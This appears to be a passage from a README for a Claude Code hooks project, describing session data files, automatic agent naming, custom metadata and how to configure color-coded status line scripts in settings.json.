Status lines leverage session data stored in `.claude/data/sessions/<session_id>.json`:

```json
{
  "session_id": "unique-session-id",
  "prompts": ["first prompt", "second prompt", ...],
  "agent_name": "Phoenix",  // Auto-generated unique name
  "extras": {              // v4: Custom metadata (optional)
    "project": "myapp",
    "status": "debugging",
    "environment": "prod"
  }
}
```

**Agent Naming:**
- Automatically generates unique agent names using LLM services
- Priority: Ollama (local) → Anthropic → OpenAI → Fallback names
- Names are single-word, memorable identifiers (e.g., Phoenix, Sage, Nova)
- Enabled via `--name-agent` flag in `user_prompt_submit.py`

**Custom Metadata (v4):**
- Use `/update_status_line` command to add custom key-value pairs
- Displayed at the end of the status line in cyan brackets
- Persists across Claude Code interactions
- Example: `/update_status_line <session_id> project myapp`

### Configuration

Set your preferred status line in `.claude/settings.json`:

```json
{
  "statusLine": {
    "type": "command",
    "command": "uv run $CLAUDE_PROJECT_DIR/.claude/status_lines/status_line_v3.py"
  }
}
```

**Status Line Features:**
- **Real-time updates** - Refreshes on message changes (300ms throttle)
- **Color coding** - Visual indicators for different task types
- **Smart truncation** - Manages long prompts elegantly
- **Session persistence** - Maintains context across interactions

**Task Type Indicators (v2/v3):**
- 🔍 Purple - Analysis/search tasks
- 💡 Green - Creation/implementation tasks
- 🔧 Yellow - Fix/debug tasks
- 🗑️ Red - Deletion tasks
- ❓ Blue - Questions
- 💬 Default - General conversation


## Master Agentic Coding

> Prepare for the future of software engineering

Learn tactical agentic coding patterns with [Tactical Agentic Coding](https://agenticengineer.com/tactical-agentic-coding?y=ssvhooks)

Follow the [IndyDevDan YouTube channel](https://www.youtube.com/@indydevdan) to improve your agentic coding advantage.